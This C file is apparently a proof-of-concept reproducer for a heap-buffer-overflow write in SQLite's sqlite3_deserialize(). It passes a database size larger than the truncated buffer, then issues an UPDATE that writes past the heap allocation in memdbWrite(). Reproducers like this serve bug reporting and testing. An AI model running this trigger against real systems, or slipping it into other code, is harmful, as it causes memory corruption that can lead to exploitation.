/*
 * Reproducer for heap-buffer-overflow WRITE via sqlite3_deserialize()
 *
 * Bug: sqlite3_deserialize() does not validate that szDb <= szBuf.
 * When szDb > szBuf, the internal MemStore has sz > szAlloc.
 *
 * In memdbWrite() (memdb.c line 319):
 *   memcpy(p->aData+iOfst, z, iAmt);
 * When iOfst+iAmt <= p->sz but iOfst >= szAlloc, this writes past the buffer.
 *
 * CWE-122: Heap-based Buffer Overflow (write)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sqlite3.h"

int main(void) {
    sqlite3 *db = NULL;
    int rc;
    sqlite3_int64 sz = 0;
    unsigned char *pBuf = NULL;

    /* Step 1: Create a database with enough data to span many pages */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) return 1;

    rc = sqlite3_exec(db,
        "CREATE TABLE t1(x TEXT);"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));"
        "INSERT INTO t1 VALUES(zeroblob(5000));",
        NULL, NULL, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    /* Step 2: Serialize */
    pBuf = sqlite3_serialize(db, "main", &sz, 0);
    if (!pBuf || sz <= 0) {
        sqlite3_close(db);
        return 1;
    }
    printf("Full serialized size: %lld bytes\n", (long long)sz);
    sqlite3_close(db);
    db = NULL;

    /* Step 3: Allocate truncated buffer */
    sqlite3_int64 truncSz = 8192;
    if (truncSz >= sz) {
        fprintf(stderr, "DB too small\n");
        sqlite3_free(pBuf);
        return 1;
    }

    unsigned char *pData = (unsigned char *)malloc((size_t)truncSz);
    if (!pData) {
        sqlite3_free(pBuf);
        return 1;
    }
    memcpy(pData, pBuf, (size_t)truncSz);
    sqlite3_free(pBuf);

    /* Step 4: Deserialize with szDb (full) > szBuf (truncated) */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        free(pData);
        return 1;
    }

    rc = sqlite3_deserialize(db, "main", pData, sz, truncSz, 0);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Deserialize failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        free(pData);
        return 1;
    }

    printf("Deserialized: szDb=%lld, szBuf=%lld\n", (long long)sz, (long long)truncSz);

    /* Step 5: Attempt a write. The UPDATE will modify pages that SQLite
     * thinks are within the file (sz), but are actually past the buffer (truncSz).
     * This triggers heap-buffer-overflow WRITE in memdbWrite().
     */
    rc = sqlite3_exec(db,
        "UPDATE t1 SET x = zeroblob(5000) WHERE rowid = 1;",
        NULL, NULL, NULL);
    printf("UPDATE result: rc=%d\n", rc);

    sqlite3_close(db);
    free(pData);
    return 0;
}
